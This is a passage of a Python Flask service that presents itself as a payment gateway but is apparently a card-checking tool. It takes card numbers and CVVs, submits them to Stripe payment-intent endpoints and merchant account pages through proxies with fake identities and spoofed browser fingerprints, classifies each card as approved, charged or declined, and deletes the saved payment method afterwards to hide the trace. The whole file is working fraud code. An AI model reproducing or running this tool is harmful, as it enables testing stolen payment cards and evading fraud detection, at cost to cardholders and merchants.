                'payment_method_data[pasted_fields]': "number",
                'payment_method_data[payment_user_agent]': f"stripe.js/{random.randint(280000000, 290000000)}; stripe-js-v3/{random.randint(280000000, 290000000)}; payment-element",
                'payment_method_data[referrer]': f"https://crm.{gateway_config["help_1_url"]}",
                'payment_method_data[time_on_page]': str(random.randint(120000, 240000)),
                'payment_method_data[client_attribution_metadata][client_session_id]': str(fake.uuid4()),
                'payment_method_data[client_attribution_metadata][merchant_integration_source]': "elements",
                'payment_method_data[client_attribution_metadata][merchant_integration_subtype]': "payment-element",
                'payment_method_data[client_attribution_metadata][merchant_integration_version]': "2021",
                'payment_method_data[client_attribution_metadata][payment_intent_creation_flow]': "standard",
                'payment_method_data[client_attribution_metadata][payment_method_selection_flow]': "automatic",
                'payment_method_data[client_attribution_metadata][elements_session_config_id]': str(fake.uuid4()),
                'payment_method_data[client_attribution_metadata][merchant_integration_additional_elements][0]': "payment",
                'payment_method_data[guid]': str(fake.uuid4()),
                'payment_method_data[muid]': str(fake.uuid4()),
                'payment_method_data[sid]': str(fake.uuid4()),
                'expected_payment_method_type': "card",
                'use_stripe_sdk': "true",
                'key': pk_live,
                'client_attribution_metadata[client_session_id]': str(fake.uuid4()),
                'client_attribution_metadata[merchant_integration_source]': "elements",
                'client_attribution_metadata[merchant_integration_subtype]': "payment-element",
                'client_attribution_metadata[merchant_integration_version]': "2021",
                'client_attribution_metadata[payment_intent_creation_flow]': "standard",
                'client_attribution_metadata[payment_method_selection_flow]': "automatic",
                'client_attribution_metadata[elements_session_config_id]': str(fake.uuid4()),
                'client_attribution_metadata[merchant_integration_additional_elements][0]': "payment",
                'client_secret': Client_secret
            }

            info = f"https://api.stripe.com/v1/payment_intents/{Payment_intent_id}/confirm"

    else:
        logger.error(f"Unsupported gateway type: {gateway_config['gateway_type']}")
        return False, f"Unsupported gateway type: {gateway_config['gateway_type']}", None

    return True, payload, info

def delete_payment_method(request_id, card_number, gateway_config, random_person, url, session):
    """Execute payment method deletion and return success status"""
    try:
        account_response = session.post(
            url=url,
            allow_redirects=True,
            timeout=15  # Shorter timeout for delete operations
        )
        account_response.raise_for_status()
        session.cookies.update(account_response.cookies)

        tree = html.fromstring(account_response.content)

        # Extract delete URL
        delete_links = tree.xpath('//a[contains(concat(" ", normalize-space(@class), " "), " delete ")]/@href')

        if not delete_links:
            logger.warning("No delete link found on account page")
            return False

        delete_url = delete_links[0]

        delete_response = session.post(
            url=delete_url,
            allow_redirects=True,
            timeout=15  # Shorter timeout for delete operations
        )
        delete_response.raise_for_status()
        session.cookies.update(account_response.cookies)
        
        return "Payment method deleted" in delete_response.text
            
    except requests.RequestException as e:
        logger.error(f"Request failed in delete_payment_method: {str(e)}")
        return False
    except Exception as e:
        logger.error(f"Unexpected error in delete_payment_method: {str(e)}")
        return False

def _parse_payment_response(request_id, card_number, content, random_person, gateway_config, session):
    """Parse and interpret payment gateway response (HTML or JSON)"""
    try:
        try:
            data = json.loads(content)
            
            # Check for proxy error first
            if 'proxy_error' in data:
                return ERROR, data['proxy_error']
            
            # Check for Stripe Charge success (payment_intent with status succeeded)
            if data.get('status') == 'succeeded':
                message = 'Succeeded'
                return CHARGE, message
            
            if data.get('status') == 'requires_action':
                message = 'Challenge Required'
                return PASSAD, message
            
            # Check for success in JSON response
            if data.get('success') is True:
                message = 'Approved'
                return SUCCESS, message
            
            # Check for error in JSON response - handle both direct and nested error structures
            error_message = 'Unknown error'
            
            # Check for direct error object (Stripe Charge response)
            if 'error' in data:
                error_obj = data['error'] 
                # Try to get message from error object
                error_message = error_obj.get('message', 'Unknown error')
                # If there's a decline_code, include it for more context
                if 'decline_code' in error_obj:
                    if error_obj['decline_code'] == 'insufficient_funds':
                        return INSUFFICIENT_FUNDS, 'Insufficient Funds'
                    decline_code = error_obj['decline_code'].replace('_', ' ').title()
                    error_message = f"{error_message} ({decline_code})"
            # Check for nested error structure (other gateway responses)
            elif 'data' in data and 'error' in data['data']:
                error_message = data['data']['error'].get('message', 'Unknown error').split('Error: ')[-1]
                
            return FAILED, error_message
            
        except json.JSONDecodeError:
            # If not JSON, parse as HTML
            tree = html.fromstring(content)
            extracted_message = "Unknown response"
            success_xpath = gateway_config['success_message']
            error_xpath = gateway_config['error_message']
            parsed_url = urlparse(gateway_config['url'])
            origin = f"{parsed_url.scheme}://{parsed_url.netloc}"
            # Check for success in HTML
            success = tree.xpath(success_xpath)
            if success:
                message = 'Approved'
                if not delete_payment_method(request_id, card_number, gateway_config, random_person, f"{origin}/my-account/payment-methods/", session):
                    message = 'Approved (error delete)'
                return APPROVED, message

            # Check for errors in HTML
            error = tree.xpath(error_xpath)
            if error:
                error_message = error[0].strip()
                match = re.search(r":\s*(.*?)(?=\s*\(|$)", error_message)
                extracted_message = match.group(1) if match else error_message
                
                if "Duplicate card exists in the vault" in extracted_message:
                    extracted_message = 'Approved old try again'
                    if not delete_payment_method(request_id, card_number, gateway_config, random_person, f"{origin}/my-account/payment-methods/", session):
                        extracted_message = 'Approved old try again (error delete)'
                    return APPROVED, extracted_message

                return DECLINED, extracted_message
        
        # No success or error found in either format
        logger.warning("No success or error message found in response")
        return ERROR, "No success or error message found in response"
        
    except Exception as e:
        logger.error(f"Response parsing failed: {str(e)}")
        return ERROR, f"Parsing failed: {str(e)}"
    
def confirm_payment_intent(payload, info, random_person, gateway_config=None):

    url = info

    headers = {
        'User-Agent': random_person['user_agent'],
        'Accept': "application/json",
        'sec-ch-ua-mobile': "?1",
        'origin': "https://js.stripe.com",
        'referer': "https://js.stripe.com/"
    }

    # Set proxy if provided
    proxies = get_proxy_dict(gateway_config) if gateway_config else None

    try:
        response = requests.post(url, data=payload, headers=headers, proxies=proxies, timeout=REQUEST_TIMEOUT)
        return response
    except requests.RequestException as e:
        # Check if it's a proxy error
        is_proxy_err, proxy_msg = is_proxy_error(e)
        if is_proxy_err:
            error_message = categorize_proxy_error(e)
            logger.error(f"Proxy error in confirm_payment_intent: {error_message}")
            # Return a fake response object with proxy error
            class ProxyErrorResponse:
                content = json.dumps({"proxy_error": error_message}).encode()
                text = json.dumps({"proxy_error": error_message})
                status_code = 0
            return ProxyErrorResponse()
        logger.error(f"Request failed in confirm_payment_intent: {str(e)}")
        raise

def process_payment(request_id, gateway_config, card_info, random_person, session):
    start_time = time.time()
    card_number = card_info['number']
    
    # Log payload generation start
    logger.info(f"🔧 [REQUEST {request_id}] Generating payment payload...")
    status, result, info = generate_payload_payment(request_id, card_number, random_person, gateway_config, card_info, session)
    if not status:
        return ERROR, result
    
    payload = result
    payload_time = time.time() - start_time
    logger.info(f"⏱️ [REQUEST {request_id}] Payload generated in {payload_time:.2f}s")

    try:
        if "Stripe Charge" in gateway_config['gateway_type']:
            if "v1_without_cookies" in gateway_config['version']:
                response = confirm_payment_intent(payload, info, random_person, gateway_config)
        else:
            response = session.post(
                url=gateway_config["post_url"],
                data=payload,
                allow_redirects=True,
                timeout=REQUEST_TIMEOUT
            )
            session.cookies.update(response.cookies)
        
        # Parse response and clean up session after processing
        status, message = _parse_payment_response(request_id, card_number, response.content, random_person, gateway_config, session)
        
        # Clean up the session for this request to free memory
        session_manager.cleanup_session(request_id)
        
        return status, message
        
    except requests.RequestException as e:
        logger.error(f"Payment request failed for {request_id}: {str(e)}")
        # Clean up session on error as well
        session_manager.cleanup_session(request_id)
        
        # Check if it's a proxy error and provide user-friendly message
        is_proxy_err, proxy_msg = is_proxy_error(e)
        if is_proxy_err:
            error_message = categorize_proxy_error(e)
            logger.error(f"🔴 [REQUEST {request_id}] Proxy error detected: {error_message}")
            return ERROR, error_message
        
        return ERROR, f"Request failed: {str(e)}"

@app.route('/')
def index():
    return "Payment Gateway Service - Request Isolation Enabled"

@app.route('/status')
def system_status():
    """Get system status including active sessions count"""
    active_sessions = session_manager.get_active_sessions_count()
    return jsonify({
        "status": "running",
        "active_sessions": active_sessions,
        "isolation_mode": "request_based",
        "timestamp": datetime.now().isoformat()
    })

@app.route('/payment', methods=['POST'])
def handle_payment():
    # Generate unique request ID for complete isolation
    request_id = session_manager.create_request_id()
    start_time = time.time()
    
    logger.info(f"🔄 [REQUEST {request_id}] Started payment request processing")
    
    try:
        data = request.get_json()
        if not data:
            logger.error(f"❌ [REQUEST {request_id}] No data received in request")
            return jsonify({"status": ERROR, "result": "No data received"}), 400
        
        # Validate gateway configuration
        gateway_config = data.get('gateway_config')
        if not gateway_config:
            logger.error(f"❌ [REQUEST {request_id}] Missing gateway configuration")
            return jsonify({"status": ERROR, "result": "Gateway configuration is missing"}), 400
        
        # Validate card information
        card_info = data.get('card')
        if not card_info:
            logger.error(f"❌ [REQUEST {request_id}] No card information provided")
            return jsonify({"status": ERROR, "result": "Card information is missing"}), 400
        
        required_card_fields = ['number', 'month', 'year', 'cvv']
        for field in required_card_fields:
            if field not in card_info or not card_info[field]:
                logger.error(f"❌ [REQUEST {request_id}] Missing required card field: {field}")
                return jsonify({"status": ERROR, "result": f"{field} is missing in card info"}), 400
        
        # Log card identification for debugging (only last 4 digits)
        card_number = card_info['number']
        logger.info(f"💳 [REQUEST {request_id}] Processing payment for card ending in: {card_number[-4:]}")
        logger.info(f"📊 [REQUEST {request_id}] Active sessions count: {session_manager.get_active_sessions_count()}")
            
        # Generate random person profile
        random_person = generate_random_person()
        if not random_person:
            logger.error(f"❌ [REQUEST {request_id}] Failed to generate random person profile")
            return jsonify({"status": ERROR, "result": "Failed to generate random person"}), 400
        
        logger.info(f"👤 [REQUEST {request_id}] Generated profile for: {random_person['first_name']} {random_person['last_name']}")
        
        # Get isolated session for this specific request
        try:
            session = get_session(request_id, gateway_config, random_person)
            logger.info(f"🔗 [REQUEST {request_id}] Created isolated session")
        except ProxyConnectionError as proxy_err:
            processing_time = time.time() - start_time
            logger.error(f"🔴 [REQUEST {request_id}] Proxy connection failed: {proxy_err.message}")
            return jsonify({
                "status": ERROR,
                "result": proxy_err.message,
                "request_id": request_id,
                "processing_time": round(processing_time, 2)
            }), 400
            
        # Process payment with request-specific session
        status, result = process_payment(
            request_id,
            gateway_config,
            card_info,
            random_person,
            session=session
        )
        
        processing_time = time.time() - start_time
        logger.info(f"✅ [REQUEST {request_id}] Payment processed - Status: {status}, Result: {result}")
        logger.info(f"⏱️ [REQUEST {request_id}] Total processing time: {processing_time:.2f} seconds")
        logger.info(f"🧹 [REQUEST {request_id}] Session cleanup completed")

        if ERROR in status:
            return jsonify({
                "status": status,
                "result": result,
                "request_id": request_id,
                "processing_time": round(processing_time, 2)
            }), 400
        
        else:
            return jsonify({
                "status": status,
                "result": result,
                "request_id": request_id,
                "processing_time": round(processing_time, 2)
            }), 200
    
    except ProxyConnectionError as proxy_err:
        # Handle proxy errors specifically
        session_manager.cleanup_session(request_id)
        processing_time = time.time() - start_time
        logger.error(f"🔴 [REQUEST {request_id}] Proxy error: {proxy_err.message}")
        return jsonify({
            "status": ERROR,
            "result": proxy_err.message,
            "request_id": request_id,
            "processing_time": round(processing_time, 2)
        }), 400
        
    except Exception as e:
        # Ensure session cleanup even on unexpected errors
        session_manager.cleanup_session(request_id)
        
        # Check if it's a proxy-related error
        is_proxy_err, proxy_msg = is_proxy_error(e)
        if is_proxy_err:
            error_message = categorize_proxy_error(e)
            logger.error(f"🔴 [REQUEST {request_id}] Proxy error: {error_message}")
            return jsonify({
                "status": ERROR,
                "result": error_message,
                "request_id": request_id
            }), 400
        
        logger.error(f"💥 [REQUEST {request_id}] Unexpected error: {str(e)}", exc_info=True)
        return jsonify({
            "status": ERROR,
            "result": "Internal server error",
            "request_id": request_id
        }), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
